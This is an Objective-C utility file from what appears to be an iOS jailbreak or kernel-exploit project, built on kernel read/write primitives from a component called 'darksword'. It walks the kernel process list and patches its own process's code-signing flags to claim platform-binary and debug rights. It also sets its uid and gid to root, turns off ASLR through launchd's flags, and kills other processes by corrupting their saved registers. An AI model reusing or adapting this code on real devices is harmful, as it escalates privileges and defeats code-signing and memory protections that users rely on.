//
//  utils.m
//  lara
//

#import "utils.h"
#import "darksword.h"
#import "xpf.h"
#import "offsets.h"

#import <Foundation/Foundation.h>
#import <stdio.h>
#import <unistd.h>
#import <string.h>
#include <stdarg.h>
#import <sys/types.h>
#include <sys/sysctl.h>
#include <stdint.h>
#include <stdbool.h>

#ifndef CS_OPS_STATUS
#define CS_OPS_STATUS 0
#endif

extern int csops(pid_t pid, unsigned int ops, void *useraddr, size_t usersize);

#define P_DISABLE_ASLR 0x00001000

uint32_t PROC_PID_OFFSET;                           // p_pid
static const uint32_t PROC_NAME_OFFSET = 0x56c;     // p_comm
static const uint32_t PROC_UID_OFFSET  = 0x30;      // p_uid
static const uint32_t PROC_GID_OFFSET  = 0x34;      // p_gid
static const uint32_t PROC_NEXT_OFFSET = 0x08;      // p_list le_next
static const uint32_t PROC_PREV_OFFSET = 0x00;      // p_list le_prev
static const uint32_t PROC_PFLAG_OFFSET = 0x454;
static const uint32_t ARM_SS_OFFSET = 0x8;
static const uint32_t PROC_PROC_RO_OFFSET = 0x18;
static const uint32_t UCRED_CR_LABEL_OFFSET = 0x78;
uint64_t PROC_STRUCT_SIZE;
uint32_t TASK_TNEXT_OFFSET;
uint32_t THREAD_MUPCB_OFFSET;

#ifndef CS_VALID
#define CS_VALID 0x00000001
#endif
#ifndef CS_ADHOC
#define CS_ADHOC 0x00000002
#endif
#ifndef CS_GET_TASK_ALLOW
#define CS_GET_TASK_ALLOW 0x00000004
#endif
#ifndef CS_INSTALLER
#define CS_INSTALLER 0x00000008
#endif
#ifndef CS_HARD
#define CS_HARD 0x00000100
#endif
#ifndef CS_KILL
#define CS_KILL 0x00000200
#endif
#ifndef CS_DEBUGGED
#define CS_DEBUGGED 0x10000000
#endif
#ifndef CS_PLATFORM_BINARY
#define CS_PLATFORM_BINARY 0x00400000
#endif

struct arm_saved_state64 {
  uint64_t x[29];
  uint64_t fp;
  uint64_t lr;
  uint64_t sp;
  uint64_t pc;
  uint32_t cpsr;
  uint32_t aspsr;
  uint64_t far;
  uint32_t esr;
  uint32_t exception;
  uint64_t jophash;
};

cpu_subtype_t get_hw_cpufamily(void) {
    cpu_subtype_t cpufam = 0;
    size_t cpufamsize = sizeof(cpufam);
    sysctlbyname("hw.cpufamily", &cpufam, &cpufamsize, NULL, 0);
    return cpufam;
}

void init_offsets(void) {
    char ios[256];
    size_t size = sizeof(ios);

    sysctlbyname("kern.osproductversion", ios, &size, NULL, 0);

    uint64_t procsize = getprocsize();
    if (procsize != 0) {
        PROC_STRUCT_SIZE = procsize;
    } else {
        printf("getprocsize() returned 0x0. defaulting to 0x740.\n");
        PROC_STRUCT_SIZE = 0x740;
    }

    int major = 0, minor = 0, patch = 0;
    sscanf(ios, "%d.%d.%d", &major, &minor, &patch);

    if (major > 18 || (major == 18 && minor >= 4)) {
        PROC_PID_OFFSET = 0x60;
    } else {
        PROC_PID_OFFSET = 0x28;
    }

    if (major == 17 && minor <= 7) {
        TASK_TNEXT_OFFSET = 0x58;
    } else if (major >= 18) {
        TASK_TNEXT_OFFSET = 0x50;
    } else {
        TASK_TNEXT_OFFSET = 0x50;
    }

    cpu_subtype_t cpufam = get_hw_cpufamily();

    bool isA10 =
        (cpufam == CPUFAMILY_ARM_HURRICANE);

    bool isA17Above =
        (cpufam == CPUFAMILY_ARM_COLL ||
         cpufam == CPUFAMILY_ARM_IBIZA ||
         cpufam == CPUFAMILY_ARM_TUPAI ||
         cpufam == CPUFAMILY_ARM_DONAN);

    if (major >= 18) {
        if (isA17Above)
            THREAD_MUPCB_OFFSET = 0x108;
        else if (isA10)
            THREAD_MUPCB_OFFSET = 0x100;
        else
            THREAD_MUPCB_OFFSET = 0xb8;
    } else {
        if (isA17Above)
            THREAD_MUPCB_OFFSET = 0x100;
        else if (isA10)
            THREAD_MUPCB_OFFSET = 0xf8;
        else
            THREAD_MUPCB_OFFSET = 0xb0;
    }

    printf("TASK_TNEXT_OFFSET: 0x%x\n", TASK_TNEXT_OFFSET);
    printf("THREAD_MUPCB_OFFSET: 0x%x\n", THREAD_MUPCB_OFFSET);
    printf("PROC_PID_OFFSET: 0x%x\n", PROC_PID_OFFSET);
    printf("PROC_STRUCT_SIZE: 0x%llx\n", PROC_STRUCT_SIZE);
}

static NSString *const kkernprocoffset = @"lara.kernprocoff";

static bool is_kptr(uint64_t p) {
    if (p == 0) return false;
    if ((p & 0x7ULL) != 0) return false;

    // Accept canonical high-half kernel pointers; iOS 26/A18 has valid pointers below 0xffffffe000000000.
    uint64_t top16 = p & 0xFFFF000000000000ULL;
    if (top16 == 0xFFFF000000000000ULL) return true;

    // Also accept signed 56-bit canonicalized pointers.
    uint64_t top8 = p & 0xFF00000000000000ULL;
    return top8 == 0xFF00000000000000ULL;
}

static inline uint64_t xpaci(uint64_t a);

static inline uint64_t sign_kernel_ptr(uint64_t value) {
    if (is_kptr(value)) return value;
    // arm64e pointers may be truncated; sign-extend only when high sign bits are present.
    if (value & (1ULL << 55)) return value | 0xFF00000000000000ULL;
    if (value & (1ULL << 47)) return value | 0xFFFF000000000000ULL;
    return value;
}

static inline uint64_t normalize_kernel_ptr(uint64_t raw) {
    return sign_kernel_ptr(xpaci(raw));
}

static void kernel_logf(const char *fmt, ...) __attribute__((format(printf, 1, 2)));
static void kernel_logf(const char *fmt, ...) {
    char buffer[1024];
    va_list ap;
    va_start(ap, fmt);
    vsnprintf(buffer, sizeof(buffer), fmt, ap);
    va_end(ap);

    printf("%s\n", buffer);

    NSString *msg = [NSString stringWithUTF8String:buffer];
    if (!msg) return;

    [[NSNotificationCenter defaultCenter] postNotificationName:@"NXKernelLog"
                                                        object:nil
                                                      userInfo:@{ @"message": msg }];
}

static uint64_t procsize_or_default(void) {
    uint64_t procsize = getprocsize();
    if (!procsize) {
        procsize = PROC_STRUCT_SIZE;
    }
    if (!procsize) {
        procsize = 0x740;
    }
    return procsize;
}

static uint32_t find_csflags_offset(uint64_t proc) {
    uint32_t expectedCsflags = 0;
    if (csops(getpid(), CS_OPS_STATUS, &expectedCsflags, sizeof(expectedCsflags)) == 0) {
        for (uint32_t off = 0x100; off + 4 < procsize_or_default(); off += 4) {
            uint32_t value = ds_kread32(proc + off);
            if (value == expectedCsflags) {
                return off;
            }

            uint32_t significant = (CS_VALID |
                                    CS_ADHOC |
                                    CS_GET_TASK_ALLOW |
                                    CS_INSTALLER |
                                    CS_HARD |
                                    CS_KILL |
                                    CS_DEBUGGED |
                                    CS_PLATFORM_BINARY);
            if ((value & significant) == (expectedCsflags & significant) &&
                (value & CS_VALID)) {
                return off;
            }
        }
    }

    uint64_t procsize = procsize_or_default();
    uint64_t launchd = procbypid(1);

    for (uint32_t off = 0x100; off + 4 < procsize; off += 4) {
        uint32_t value = ds_kread32(proc + off);
        if (!(value & CS_VALID)) continue;
        if (value & 0xf0000000U) continue;

        if (launchd) {
            uint32_t launchdValue = ds_kread32(launchd + off);
            if (launchdValue & CS_PLATFORM_BINARY) {
                return off;
            }
        } else {
            return off;
        }
    }

    return 0;
}

static uint32_t find_ucred_offset(uint64_t proc) {
    uint64_t procsize = procsize_or_default();
    uid_t ourUid = getuid();

    for (uint32_t off = 0x80; off + 8 < procsize; off += 8) {
        uint64_t value = ds_kread64(proc + off);
        if (!is_kptr(value)) continue;

        uint32_t uid = ds_kread32(value + 0x18);
        if (uid == ourUid) {
            return off;
        }
    }

    return 0;
}

static uint64_t find_ucred_from_proc_ro(uint64_t proc) {
    uint64_t procRoRaw = ds_kread64(proc + PROC_PROC_RO_OFFSET);
    uint64_t procRo = normalize_kernel_ptr(procRoRaw);
    if (!is_kptr(procRo)) {
        kernel_logf("prepareIOKitAccess: proc_ro pointer invalid");
        return 0;
    }

    for (uint32_t off = 0x10; off <= 0x40; off += 0x8) {
        uint64_t raw = ds_kread64(procRo + off);
        uint64_t candidates[3] = {
            normalize_kernel_ptr(raw),
            normalize_kernel_ptr(raw & 0x00FFFFFFFFFFFFFFULL),
            normalize_kernel_ptr(raw & 0xFFFFFFFFFFFFFFE0ULL)
        };

        for (size_t i = 0; i < 3; i++) {
            uint64_t cand = candidates[i];
            if (!is_kptr(cand)) continue;

            uint64_t label = normalize_kernel_ptr(ds_kread64(cand + UCRED_CR_LABEL_OFFSET));
            if (!is_kptr(label)) continue;

            kernel_logf("prepareIOKitAccess: using proc_ro ucred pointer at +0x%x", off);
            return cand;
        }
    }

    kernel_logf("prepareIOKitAccess: proc_ro ucred scan failed");
    return 0;
}

static uint64_t find_ucred_from_proc_ro_with_slot(uint64_t proc, uint32_t *slotOut) {
    uint64_t procRoRaw = ds_kread64(proc + PROC_PROC_RO_OFFSET);
    uint64_t procRo = normalize_kernel_ptr(procRoRaw);
    if (!is_kptr(procRo)) {
        return 0;
    }

    for (uint32_t off = 0x10; off <= 0x40; off += 0x8) {
        uint64_t raw = ds_kread64(procRo + off);
        uint64_t candidates[3] = {
            normalize_kernel_ptr(raw),
            normalize_kernel_ptr(raw & 0x00FFFFFFFFFFFFFFULL),
            normalize_kernel_ptr(raw & 0xFFFFFFFFFFFFFFE0ULL)
        };

        for (size_t i = 0; i < 3; i++) {
            uint64_t cand = candidates[i];
            if (!is_kptr(cand)) continue;

            uint64_t label = normalize_kernel_ptr(ds_kread64(cand + UCRED_CR_LABEL_OFFSET));
            if (!is_kptr(label)) continue;

            if (slotOut) *slotOut = off;
            return cand;
        }
    }

    return 0;
}

static uint32_t find_task_offset(uint64_t proc) {
    uint64_t procsize = procsize_or_default();
    uint64_t candidate = normalize_kernel_ptr(ds_kread64(proc + procsize));
    if (is_kptr(candidate)) {
        return (uint32_t)procsize;
    }

    uint32_t start = procsize > 0x10 ? (uint32_t)(procsize - 0x10) : 0x100;
    uint32_t end = (uint32_t)(procsize + 0x10);

    for (uint32_t off = start; off < end; off += 8) {
        uint64_t value = normalize_kernel_ptr(ds_kread64(proc + off));
        if (is_kptr(value)) {
            return off;
        }
    }

    return (uint32_t)procsize;
}

static uint32_t find_task_flags_offset(uint64_t task, uint32_t *taskCsflagsOffOut) {
    static NSString *const kTaskFlagsOffKey = @"lara.task_flags_offset";
    static NSString *const kTaskCsflagsOffKey = @"lara.task_csflags_offset";

    bool (^is_plausible_task_pair)(uint32_t, uint32_t) = ^bool(uint32_t flagsOff, uint32_t csOff) {
        if (!flagsOff || !csOff || flagsOff >= 0x1000 || csOff >= 0x1000) return false;
        uint32_t flags = ds_kread32(task + flagsOff);
        uint32_t cs = ds_kread32(task + csOff);
        if ((flags & 0xffff0000U) != 0) return false;
        if ((flags & 0x1U) == 0) return false;
        if ((cs & CS_VALID) == 0) return false;
        if (cs & 0xf0000000U) return false;
        return true;
    };

    void (^persist_task_pair)(uint32_t, uint32_t) = ^(uint32_t flagsOff, uint32_t csOff) {
        NSUserDefaults *defaults = [NSUserDefaults standardUserDefaults];
        [defaults setObject:@(flagsOff) forKey:kTaskFlagsOffKey];
        [defaults setObject:@(csOff) forKey:kTaskCsflagsOffKey];
        [defaults synchronize];
    };

    if (taskCsflagsOffOut) {
        *taskCsflagsOffOut = 0;
    }

    uint32_t savedTaskFlagsOff = (uint32_t)gettaskflagsoffset();
    uint32_t savedTaskCsflagsOff = (uint32_t)gettaskcsflagsoffset();
    if (savedTaskFlagsOff) {
        uint32_t csOff = savedTaskCsflagsOff ? savedTaskCsflagsOff : (savedTaskFlagsOff + 4);
        if (is_plausible_task_pair(savedTaskFlagsOff, csOff)) {
            if (taskCsflagsOffOut) {
                *taskCsflagsOffOut = csOff;
            }
            return savedTaskFlagsOff;
        }
    }

    static const uint32_t knownPairs[][2] = {
        { 0x3a0, 0x3a4 },
        { 0x3ac, 0x3b0 },
        { 0x39c, 0x3a0 },
        { 0x3b0, 0x3b4 },
    };
    for (size_t i = 0; i < sizeof(knownPairs) / sizeof(knownPairs[0]); i++) {
        uint32_t flagsOff = knownPairs[i][0];
        uint32_t csOff = knownPairs[i][1];
        if (is_plausible_task_pair(flagsOff, csOff)) {
            persist_task_pair(flagsOff, csOff);
            if (taskCsflagsOffOut) {
                *taskCsflagsOffOut = csOff;
            }
            return flagsOff;
        }
    }

    uint64_t launchd = procbypid(1);
    uint64_t launchdTask = 0;

    if (launchd) {
        uint32_t taskOff = find_task_offset(launchd);
        if (taskOff) {
            uint64_t candidate = ds_kread64(launchd + taskOff);
            if (is_kptr(candidate)) {
                launchdTask = candidate;
            }
        }
    }

    for (uint32_t off = 0x100; off < 0x700; off += 4) {
        uint32_t flags = ds_kread32(task + off);
        uint32_t taskFlags = ds_kread32(task + off + 4);

        if ((flags & 0xffff0000U) != 0) continue;
        if ((flags & 0x0001U) == 0) continue;
        if ((taskFlags & CS_VALID) == 0) continue;
        if (taskFlags & 0xf0000000U) continue;

        if (launchdTask) {
            uint32_t launchdFlags = ds_kread32(launchdTask + off);
            if (launchdFlags & 0x00000400U) {
                persist_task_pair(off, off + 4);
                if (taskCsflagsOffOut) {
                    *taskCsflagsOffOut = off + 4;
                }
                return off;
            }
        } else {
            persist_task_pair(off, off + 4);
            if (taskCsflagsOffOut) {
                *taskCsflagsOffOut = off + 4;
            }
            return off;
        }
    }

    for (uint32_t off = 0x100; off < 0x700; off += 4) {
        uint32_t csOff = off + 4;
        if (!is_plausible_task_pair(off, csOff)) continue;
        persist_task_pair(off, csOff);
        if (taskCsflagsOffOut) {
            *taskCsflagsOffOut = csOff;
        }
        return off;
    }

    return 0;
}

static bool kwrite32_retry(uint64_t address, uint32_t value, int attempts) {
    if (attempts < 1) attempts = 1;
    for (int i = 0; i < attempts; i++) {
        ds_kwrite32(address, value);
        if (ds_kread32(address) == value) {
            return true;
        }
        usleep(2000);
    }
    return false;
}

static bool kwrite64_retry(uint64_t address, uint64_t value, int attempts) {
    if (attempts < 1) attempts = 1;
    for (int i = 0; i < attempts; i++) {
        ds_kwrite64(address, value);
        if (ds_kread64(address) == value) {
            return true;
        }
        usleep(2000);
    }
    return false;
}

static int prepareIOKitAccess(void) {
    if (!ds_is_ready()) {
        kernel_logf("prepareIOKitAccess: darksword not ready");
        return -1;
    }

    kernel_logf("prepareIOKitAccess: starting process patching");

    uint64_t self = ds_get_our_proc();
    if (!is_kptr(self)) {
        self = procbypid(getpid());
    }
    if (!is_kptr(self)) {
        self = ourproc();
    }
    if (!self) {
        kernel_logf("prepareIOKitAccess: could not resolve our proc");
        return -1;
    }

    uint32_t csflagsOff = (uint32_t)getcsflagsoffset();
    if (!csflagsOff) {
        csflagsOff = find_csflags_offset(self);
    }
    if (!csflagsOff) {
        kernel_logf("prepareIOKitAccess: could not resolve csflags offset");
        return -1;
    }

    kernel_logf("prepareIOKitAccess: csflags offset = 0x%x", csflagsOff);

    uint32_t ucredOff = (uint32_t)getucredooffset();
    if (!ucredOff) {
        ucredOff = find_ucred_offset(self);
    }
    uint64_t ucred = 0;
    uint32_t selfProcRoUcredSlot = 0;
    if (ucredOff) {
        kernel_logf("prepareIOKitAccess: ucred offset = 0x%x", ucredOff);
        ucred = normalize_kernel_ptr(ds_kread64(self + ucredOff));
    } else {
        kernel_logf("prepareIOKitAccess: could not resolve ucred offset, trying proc_ro fallback");
    }

    if (!is_kptr(ucred)) {
        ucred = find_ucred_from_proc_ro_with_slot(self, &selfProcRoUcredSlot);
        if (is_kptr(ucred) && selfProcRoUcredSlot) {
            kernel_logf("prepareIOKitAccess: using proc_ro ucred pointer at +0x%x", selfProcRoUcredSlot);
        }
    }

    if (!is_kptr(ucred)) {
        kernel_logf("prepareIOKitAccess: invalid ucred pointer after fallback");
        return -1;
    }

    uint64_t task = normalize_kernel_ptr(ds_get_our_task());
    uint32_t taskOff = 0;
    if (!is_kptr(task)) {
        taskOff = find_task_offset(self);
        task = normalize_kernel_ptr(ds_kread64(self + taskOff));
    }
    if (!is_kptr(task)) {
        kernel_logf("prepareIOKitAccess: invalid task pointer");
        return -1;
    }

    if (taskOff) {
        kernel_logf("prepareIOKitAccess: task offset = 0x%x", taskOff);
    } else {
        kernel_logf("prepareIOKitAccess: using ds_get_our_task() task pointer");
    }

    uint32_t oldCsflags = ds_kread32(self + csflagsOff);
    uint32_t newCsflags = oldCsflags |
        CS_PLATFORM_BINARY |
        CS_DEBUGGED |
        CS_GET_TASK_ALLOW |
        CS_INSTALLER;
    ds_kwrite32(self + csflagsOff, newCsflags);
    if (ds_kread32(self + csflagsOff) != newCsflags) {
        kernel_logf("prepareIOKitAccess: csflags verify failed");
        return -1;
    }

    kernel_logf("prepareIOKitAccess: proc csflags patched");

    bool hadNonCriticalFailures = false;

    uint32_t oldUid = ds_kread32(self + PROC_UID_OFFSET);
    uint32_t oldGid = ds_kread32(self + PROC_GID_OFFSET);
    bool uidPatched = kwrite32_retry(self + PROC_UID_OFFSET, 0, 3);
    bool gidPatched = kwrite32_retry(self + PROC_GID_OFFSET, 0, 3);
    uint32_t newUid = ds_kread32(self + PROC_UID_OFFSET);
    uint32_t newGid = ds_kread32(self + PROC_GID_OFFSET);
    kernel_logf("prepareIOKitAccess: proc uid before=%u after=%u, gid before=%u after=%u",
                oldUid, newUid, oldGid, newGid);
    if (!uidPatched || !gidPatched || newUid != 0 || newGid != 0) {
        kernel_logf("prepareIOKitAccess: proc uid/gid elevation verify failed (non-critical)");
        hadNonCriticalFailures = true;
    }

    // Skip mutable cred writes on iPhone17,4/iOS 26: they are not reliable with the current
    // 32-byte write primitive and do not improve the verified csflags/task path.
    kernel_logf("prepareIOKitAccess: skipping ucred mutations on this device");

    uint32_t taskCsOff = 0;
    uint32_t tfOff = find_task_flags_offset(task, &taskCsOff);
    if (tfOff) {
        if (taskCsOff) {
            kernel_logf("prepareIOKitAccess: task flags offset = 0x%x, task csflags offset = 0x%x", tfOff, taskCsOff);
        }

        uint32_t tf = ds_kread32(task + tfOff);
        uint32_t newTf = tf | 0x400;
        ds_kwrite32(task + tfOff, newTf);
        uint32_t verifiedTf = ds_kread32(task + tfOff);
        kernel_logf("prepareIOKitAccess: task flags before=0x%x after=0x%x", tf, verifiedTf);
        if (verifiedTf != newTf) {
            kernel_logf("prepareIOKitAccess: task flags verify failed (non-critical)");
            hadNonCriticalFailures = true;
        }

        if (!taskCsOff) {
            taskCsOff = tfOff + 4;
        }
        uint32_t taskCs = ds_kread32(task + taskCsOff);
        uint32_t newTaskCs = taskCs |
            CS_PLATFORM_BINARY |
            CS_DEBUGGED |
            CS_GET_TASK_ALLOW;
        ds_kwrite32(task + taskCsOff, newTaskCs);
        uint32_t verifiedTaskCs = ds_kread32(task + taskCsOff);
        kernel_logf("prepareIOKitAccess: task csflags before=0x%x after=0x%x", taskCs, verifiedTaskCs);
        if (verifiedTaskCs != newTaskCs) {
            kernel_logf("prepareIOKitAccess: task csflags verify failed (non-critical)");
            hadNonCriticalFailures = true;
        }

        kernel_logf("prepareIOKitAccess: task flags/csflags patched");
    } else {
        kernel_logf("prepareIOKitAccess: task flags offset not found; continuing");
    }

    if (hadNonCriticalFailures) {
        kernel_logf("prepareIOKitAccess: patching finished with non-critical failures");
    } else {
        kernel_logf("prepareIOKitAccess: patching finished successfully");
    }

    return 0;
}

bool is_pac_supported(void) {
    cpu_subtype_t cpusubtype = 0;
    size_t sz = sizeof(cpusubtype);
    if (sysctlbyname("hw.cpusubtype", &cpusubtype, &sz, NULL, 0) != 0)
        return false;

    return cpusubtype == CPU_SUBTYPE_ARM64E;
}

static inline uint64_t xpaci(uint64_t a) {
    if (!is_pac_supported()) return a;
    if ((a & 0xFFFFFF0000000000ULL) == 0xFFFFFF0000000000ULL) return a;

    register uint64_t x0 asm("x0") = a;
    asm volatile(".long 0xDAC143E0" : "+r"(x0)); // XPACI X0
    return x0;
}

static uint64_t loadkernproc(void) {
    NSNumber *n = [[NSUserDefaults standardUserDefaults] objectForKey:kkernprocoffset];
    if (!n) return 0;
    return (uint64_t)n.unsignedLongLongValue;
}

static uint64_t kernprocaddress(void) {
    uint64_t offset = loadkernproc();
    if (offset != 0) {
        return ds_get_kernel_base() + offset;
    }

    uint64_t kernslide = ds_get_kernel_slide();
    return 0xfffffff0079fd9c8 + kernslide;
}

uint64_t procbypid(pid_t targetpid) {
    if (!ds_is_ready()) {
        printf("darksword not ready\n");
        return 0;
    }

    uint64_t kernprocaddr = kernprocaddress();
    uint64_t kernproc = ds_kread64(kernprocaddr);

    printf("kernel proc: 0x%llx\n", kernproc);

    if (!is_kptr(kernproc)) {
        printf("kernel proc pointer invalid\n");
        return 0;
    }

    printf("looking for pid: %d\n", targetpid);

    uint64_t currentproc = kernproc;
    int count = 0;

    while (currentproc && count < 2000) {

        if (!is_kptr(currentproc)) {
            printf("proc pointer invalid at step %d\n", count);
            break;
        }

        uint32_t pid = ds_kread32(currentproc + PROC_PID_OFFSET);

        if (pid == targetpid) {

            char name[64] = {0};
            ds_kread(currentproc + PROC_NAME_OFFSET, name, 32);

            uint32_t uid = ds_kread32(currentproc + PROC_UID_OFFSET);
            uint32_t gid = ds_kread32(currentproc + PROC_GID_OFFSET);

            printf("found proc: %s (pid=%d uid=%d gid=%d) @ 0x%llx\n",
                   name, pid, uid, gid, currentproc);

            return currentproc;
        }

        uint64_t next = ds_kread64(currentproc + PROC_NEXT_OFFSET);

        if (!is_kptr(next) || next == currentproc) {
            printf("proc list ended at step %d\n", count);
            break;
        }

        currentproc = next;
        count++;
    }

    printf("pid %d not found after %d iterations\n", targetpid, count);
    return 0;
}

uint64_t ourproc(void) {
    return procbypid(getpid());
}

uint64_t taskbyproc(uint64_t procaddr) {
    if (!procaddr) return 0;
    return procaddr + PROC_STRUCT_SIZE;
}

uint64_t procbyname(const char *procname) {
    if (!procname || strlen(procname) == 0) {
        printf("invalid process name\n");
        return 0;
    }

    if (!ds_is_ready()) {
        printf("darksword not ready\n");
        return 0;
    }

    uint64_t kernprocaddr = kernprocaddress();
    uint64_t kernproc = ds_kread64(kernprocaddr);

    if (!is_kptr(kernproc)) {
        printf("kernel proc pointer invalid\n");
        return 0;
    }

    printf("looking for process: %s\n", procname);

    uint64_t currentproc = kernproc;
    int count = 0;

    while (currentproc && count < 2000) {
        if (!is_kptr(currentproc)) {
            break;
        }

        char name[64] = {0};
        ds_kread(currentproc + PROC_NAME_OFFSET, name, 32);

        if (strcmp(name, procname) == 0) {

            uint32_t pid = ds_kread32(currentproc + PROC_PID_OFFSET);
            printf("resolved %s -> pid %d\n", procname, pid);

            return procbypid(pid);
        }

        uint64_t next = ds_kread64(currentproc + PROC_NEXT_OFFSET);

        if (!is_kptr(next) || next == currentproc) {
            break;
        }

        currentproc = next;
        count++;
    }

    printf("process '%s' not found\n", procname);
    return 0;
}

bool aslrstate;

void getaslrstate(void) {
    uint64_t launchd = procbypid(1);
    if (!launchd) {
        printf("(aslr) failed. could not find launchd proc\n");
        return;
    }

    uint32_t pflag = ds_kread32(launchd + PROC_PFLAG_OFFSET);
    aslrstate = !(pflag & P_DISABLE_ASLR);
    printf("(aslr) refreshed. aslr is %s\n", aslrstate ? "on" : "off");
}

int toggleaslr(void) {
    uint64_t launchd = procbypid(1);
    if (!launchd) {
        printf("(aslr) failed. could not find launchd proc\n");
        return -1;
    }

    uint32_t pflag = ds_kread32(launchd + PROC_PFLAG_OFFSET);
    uint32_t desired;

    if (aslrstate) {
        desired = pflag | P_DISABLE_ASLR;
        ds_kwrite32(launchd + PROC_PFLAG_OFFSET, desired);
    } else {
        desired = pflag & ~P_DISABLE_ASLR;
        ds_kwrite32(launchd + PROC_PFLAG_OFFSET, desired);
    }
    uint32_t verify = ds_kread32(launchd + PROC_PFLAG_OFFSET);
    aslrstate = !(verify & P_DISABLE_ASLR);

    printf("(aslr) aslr is now %s\n", aslrstate ? "on" : "off");

    return 0;
}

int killproc(const char* name) {
    uint64_t proc = procbyname(name);
    uint64_t task = taskbyproc(proc);
    printf("proc: 0x%llx, task: 0x%llx\n", proc, task);
    
    uint64_t threads = ds_kread64(task + TASK_TNEXT_OFFSET);
    uint64_t upcb = xpaci(ds_kread64(threads + THREAD_MUPCB_OFFSET));
    uint64_t state = upcb + ARM_SS_OFFSET;
    
    for(int i = 0; i < 11; i++) {
        ds_kwrite64(state + offsetof(struct arm_saved_state64, x[i]), 0x1337133713371337);
    }

    ds_kwrite64(state + offsetof(struct arm_saved_state64, fp), 0x1337133713371337);
    ds_kwrite64(state + offsetof(struct arm_saved_state64, sp), 0x1337133713371337);
    
    return 0;
}

int patchcsflags(void) {
    return prepareIOKitAccess();
}
